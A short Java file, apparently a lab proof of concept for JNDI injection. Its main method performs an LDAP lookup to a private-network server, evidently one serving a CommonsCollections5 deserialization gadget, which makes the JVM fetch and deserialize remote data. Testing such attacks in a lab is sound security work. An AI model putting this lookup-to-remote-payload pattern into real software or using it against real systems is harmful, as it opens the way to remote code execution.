package JNDI;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Main {
    public static void main(String[] args) throws NamingException {
        (new InitialContext()).lookup("ldap://192.168.180.1:1389/serial/CommonsCollections5");
    }
}
